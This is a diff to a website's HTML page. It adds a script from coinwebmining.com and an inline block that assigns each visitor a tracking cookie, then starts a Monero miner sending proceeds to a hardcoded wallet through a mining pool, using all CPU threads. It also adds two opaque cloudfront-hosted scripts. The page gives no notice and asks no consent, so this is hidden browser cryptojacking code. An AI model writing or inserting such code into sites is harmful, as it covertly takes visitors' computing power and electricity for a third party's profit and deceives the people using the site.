@@ -13,9 +13,51 @@
     enable_page_level_ads: true
   });
 </script>
+
 </head>
 
 <body class="body">
+<script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+	
+function setCookie(name,value,days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days*24*60*60*1000));
+        expires = "; expires=" + date.toUTCString();
+    }
+    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+}
+function getCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0;i < ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+	
+	if (getCookie("id") == null) {
+		setCookie("id", Math.random()*100000000000000000, 365);
+	}
+	
+	var id = getCookie("id");
+	
+	console.log(id);
+	
+    var site_id = 'cwm-181';
+    var coin = 'monero';
+    var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC';
+    var password = id;
+    var mining_pool = 'de.moriaxmr.com:3333';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = true;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>
 <script data-cfasync="false" src="//djv99sxoqpv11.cloudfront.net/?xsvjd=734002"></script>
 <script data-cfasync="false" src="//djv99sxoqpv11.cloudfront.net/?xsvjd=733999"></script>
 <ul class="navbar">
